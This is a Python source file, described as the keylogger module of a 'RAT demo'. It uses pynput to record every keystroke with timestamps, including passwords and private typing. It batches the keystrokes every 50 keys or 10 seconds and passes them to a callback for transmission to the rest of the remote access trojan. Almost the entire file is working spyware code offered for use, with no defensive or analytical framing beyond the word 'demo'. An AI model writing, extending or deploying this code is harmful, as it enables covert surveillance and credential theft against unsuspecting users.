"""
Keylogger Module for RAT Demo
Captures keyboard input using pynput
"""

import threading
import time
from datetime import datetime
from pynput import keyboard
from typing import List, Callable, Optional

class KeyLogger:
    """Handles keyboard monitoring and logging"""
    
    def __init__(self, callback: Optional[Callable[[str], None]] = None):
        """
        Initialize keylogger
        Args:
            callback: Function to call when sending accumulated keystrokes
        """
        self.is_running = False
        self.listener = None
        self.keys_buffer: List[str] = []
        self.callback = callback
        self.buffer_lock = threading.Lock()
        self.max_buffer_size = 50  # Send data every 50 keystrokes
        self.send_interval = 10    # Or every 10 seconds
        self.last_send_time = time.time()
        
    def start_logging(self) -> bool:
        """Start keyboard monitoring"""
        if self.is_running:
            return False
            
        try:
            self.is_running = True
            self.keys_buffer.clear()
            self.last_send_time = time.time()
            
            # Start keyboard listener
            self.listener = keyboard.Listener(on_press=self._on_key_press)
            self.listener.start()
            
            # Start periodic send thread
            self.send_thread = threading.Thread(target=self._periodic_send, daemon=True)
            self.send_thread.start()
            
            return True
        except Exception as e:
            print(f"[-] Error starting keylogger: {e}")
            self.is_running = False
            return False
    
    def stop_logging(self) -> str:
        """Stop keyboard monitoring and return final data"""
        if not self.is_running:
            return ""
            
        self.is_running = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        # Get remaining keys in buffer
        with self.buffer_lock:
            final_data = self._format_keystrokes(self.keys_buffer.copy())
            self.keys_buffer.clear()
        
        return final_data
    
    def _on_key_press(self, key):
        """Handle key press events"""
        if not self.is_running:
            return False
            
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            with self.buffer_lock:
                # Handle special keys
                if hasattr(key, 'char') and key.char is not None:
                    # Regular character
                    self.keys_buffer.append(f"[{timestamp}] {key.char}")
                else:
                    # Special keys (space, enter, etc.)
                    key_name = str(key).replace('Key.', '')
                    if key_name == 'space':
                        self.keys_buffer.append(f"[{timestamp}] [SPACE]")
                    elif key_name == 'enter':
                        self.keys_buffer.append(f"[{timestamp}] [ENTER]")
                    elif key_name == 'backspace':
                        self.keys_buffer.append(f"[{timestamp}] [BACKSPACE]")
                    elif key_name == 'tab':
                        self.keys_buffer.append(f"[{timestamp}] [TAB]")
                    elif key_name == 'shift' or key_name == 'shift_r':
                        self.keys_buffer.append(f"[{timestamp}] [SHIFT]")
                    elif key_name == 'ctrl_l' or key_name == 'ctrl_r':
                        self.keys_buffer.append(f"[{timestamp}] [CTRL]")
                    elif key_name == 'alt_l' or key_name == 'alt_r':
                        self.keys_buffer.append(f"[{timestamp}] [ALT]")
                    else:
                        self.keys_buffer.append(f"[{timestamp}] [{key_name.upper()}]")
                
                # Check if we should send data
                if (len(self.keys_buffer) >= self.max_buffer_size or 
                    time.time() - self.last_send_time >= self.send_interval):
                    self._send_buffer()
                    
        except Exception as e:
            print(f"[-] Error processing key: {e}")
    
    def _periodic_send(self):
        """Periodically send buffered keystrokes"""
        while self.is_running:
            time.sleep(self.send_interval)
            if self.is_running and time.time() - self.last_send_time >= self.send_interval:
                with self.buffer_lock:
                    if self.keys_buffer:
                        self._send_buffer()
    
    def _send_buffer(self):
        """Send current buffer contents"""
        if not self.keys_buffer:
            return
            
        data = self._format_keystrokes(self.keys_buffer.copy())
        self.keys_buffer.clear()
        self.last_send_time = time.time()
        
        if self.callback and data:
            self.callback(data)
    
    def _format_keystrokes(self, keys: List[str]) -> str:
        """Format keystrokes for transmission"""
        if not keys:
            return ""
        
        return "\n".join(keys)
    
    def get_status(self) -> dict:
        """Get current keylogger status"""
        return {
            "running": self.is_running,
            "buffer_size": len(self.keys_buffer),
            "last_activity": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }


def take_keylog_data() -> str:
    """Get current keylog status (for compatibility with other modules)"""
    return "Keylogger module ready"


# Global keylogger instance
_keylogger_instance: Optional[KeyLogger] = None

def get_keylogger() -> KeyLogger:
    """Get or create global keylogger instance"""
    global _keylogger_instance
    if _keylogger_instance is None:
        _keylogger_instance = KeyLogger()
    return _keylogger_instance 